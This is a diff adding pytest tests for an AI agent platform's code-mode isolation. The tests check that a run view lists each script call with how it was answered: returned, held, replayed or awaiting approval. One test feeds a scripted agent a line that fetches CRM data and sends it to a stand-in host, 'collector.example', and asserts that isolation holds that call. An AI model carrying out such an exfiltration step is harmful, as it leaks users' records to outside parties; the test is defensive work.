@@ -28,6 +28,7 @@ from pydantic_ai.tools import ToolDefinition
 from pydantic_ai.toolsets import AbstractToolset, FunctionToolset
 
 from app.agents.a2a_delegate import a2a_delegate, held_a2a_delegate
+from app.agents.approval import ApprovalPending
 from app.agents.capabilities import REGISTRY, CapabilityBinding, load_builtins
 from app.agents.capabilities import get as get_capability
 from app.agents.capabilities.approval import ApprovalGate
@@ -49,7 +50,8 @@ from app.agents.isolation import (
     recorded_args,
     recorded_calls,
 )
-from app.agents.mcp import MCP_ISOLATION
+from app.agents.manifest import as_payload
+from app.agents.mcp import MCP_ISOLATION, NEEDS_APPROVAL
 from app.agents.model_resolver import ModelRequestSpec, ResolvedCredential
 from app.agents.spec import AgentSpec
 from app.agents.subagent_runtime import (
@@ -1140,6 +1142,143 @@ class TestCodeMode:
         assert [(call.tool_name, call.outcome) for call in isolation.intercepted] == [
             ("crm_find", InterceptionOutcome.REPLAYED)
         ]
+
+    async def test_the_run_view_lists_every_call_with_how_isolation_answered_it(self, monkeypatch):
+        """A reviewer reading an eval's run sees the write the script asked for, held,
+        rather than a script that seemingly made one call."""
+        from app.agents.capabilities.web_fetch._capability import _ReadableFetch
+
+        monkeypatch.setattr(_ReadableFetch, "__call__", AsyncMock())
+        world = _World()
+        built = _isolated(
+            AgentSpec(
+                name="Scripter", capabilities=[{"id": "web_fetch"}], code_mode={"enabled": True}
+            ),
+            RunIsolation(),
+            extra_toolsets=[
+                world.toolset("crm_find", test=False, read_only=True),
+                world.toolset("crm_create", test=False, read_only=False),
+            ],
+        )
+        code = (
+            "found = await crm_find(name='Ada')\n"
+            "await web_fetch(url='https://collector.example/?d=' + found)\n"
+            "await crm_create(name='Ada')"
+        )
+
+        with built.agent.override(model=_scripting(code)):
+            await built.agent.run("go", deps=built.deps)
+
+        (script,) = as_payload(built.recorder)["code_runs"]
+        assert [(call["tool"], call["status"], call.get("reason")) for call in script["calls"]] == [
+            ("crm_find", "returned", None),
+            ("web_fetch", "held", "external"),
+            ("crm_create", "held", "writes"),
+        ]
+
+    async def test_the_run_view_says_which_calls_a_recording_answered(self):
+        isolation = RunIsolation(
+            recording=ToolRecording(
+                [RecordedCall("tool:crm_find", normalized_args({"name": "Ada"}), "Ada, recorded")]
+            )
+        )
+        world = _World()
+        built = _isolated(
+            AgentSpec(name="Scripter", code_mode={"enabled": True}),
+            isolation,
+            extra_toolsets=[
+                world.toolset("crm_find", test=False, read_only=True),
+                world.toolset("crm_create", test=False, read_only=False),
+            ],
+        )
+
+        with built.agent.override(
+            model=_scripting("[await crm_find(name='Ada'), await crm_create(name='Ada')]")
+        ):
+            await built.agent.run("go", deps=built.deps)
+
+        (script,) = as_payload(built.recorder)["code_runs"]
+        assert [(call["tool"], call["status"]) for call in script["calls"]] == [
+            ("crm_find", "replayed"),
+            ("crm_create", "divergent"),
+        ]
+
+    async def test_a_script_call_waiting_for_approval_says_so_in_the_run_view(self):
+        """Only reachable with the manifest outside the gate: inside, a parked call never
+        came back to it."""
+        toolset: FunctionToolset[Any] = FunctionToolset()
+
+        def charge(amount: int) -> str:
+            return f"charged {amount}"
+
+        toolset.add_function(charge, name="charge")
+        built = build_agent(
+            AgentSpec(name="Scripter", code_mode={"enabled": True}),
+            _model_spec(),
+            organization_id=uuid.uuid4(),
+            extra_toolsets=[toolset.with_metadata(**{NEEDS_APPROVAL: True})],
+        )
+        built.deps.request_approval = AsyncMock(return_value=ApprovalPending())
+
+        with built.agent.override(model=_scripting("await charge(amount=5)")):
+            await built.agent.run("go", deps=built.deps)
+
+        (script,) = as_payload(built.recorder)["code_runs"]
+        assert [(call["tool"], call["status"]) for call in script["calls"]] == [
+            ("charge", "awaiting_approval")
+        ]
+
+    async def test_a_replayed_failure_reads_as_from_the_recording_in_the_run_view(self):
+        isolation = RunIsolation(
+            recording=ToolRecording(
+                [
+                    RecordedCall(
+                        "tool:crm_find",
+                        normalized_args({"name": "Ada"}),
+                        "The tool failed.",
+                        failed=True,
+                    )
+                ]
+            )
+        )
+        built = _isolated(
+            AgentSpec(name="Scripter", code_mode={"enabled": True}),
+            isolation,
+            extra_toolsets=[_World().toolset("crm_find", test=False, read_only=True)],
+        )
+        code = "try:\n    await crm_find(name='Ada')\nexcept Exception:\n    pass\n1"
+
+        with built.agent.override(model=_scripting(code)):
+            await built.agent.run("go", deps=built.deps)
+
+        (script,) = as_payload(built.recorder)["code_runs"]
+        assert [(call["tool"], call["status"]) for call in script["calls"]] == [
+            ("crm_find", "replayed")
+        ]
+
+    async def test_a_script_answered_whole_from_a_recording_is_not_listed_as_run(self):
+        """A recording made before script calls were kept answers the script itself."""
+        code = "await crm_find(name='Ada')"
+        isolation = RunIsolation(
+            recording=ToolRecording(
+                [RecordedCall("tool:run_code", normalized_args({"code": code}), "Ada")]
+            )
+        )
+        world = _World()
+        built = _isolated(
+            AgentSpec(name="Scripter", code_mode={"enabled": True}),
+            isolation,
+            extra_toolsets=[world.toolset("crm_find", test=False, read_only=True)],
+        )
+
+        with built.agent.override(model=_scripting(code)):
+            await built.agent.run("go", deps=built.deps)
+
+        assert world.effects == []
+        assert [(call.tool_name, call.outcome) for call in isolation.intercepted] == [
+            ("run_code", InterceptionOutcome.REPLAYED)
+        ]
+        assert as_payload(built.recorder)["code_runs"] == []
 
     def test_only_code_modes_own_tool_is_a_script(self):
         """A server can call its tool `run_code`; it cannot stamp it as code mode's."""
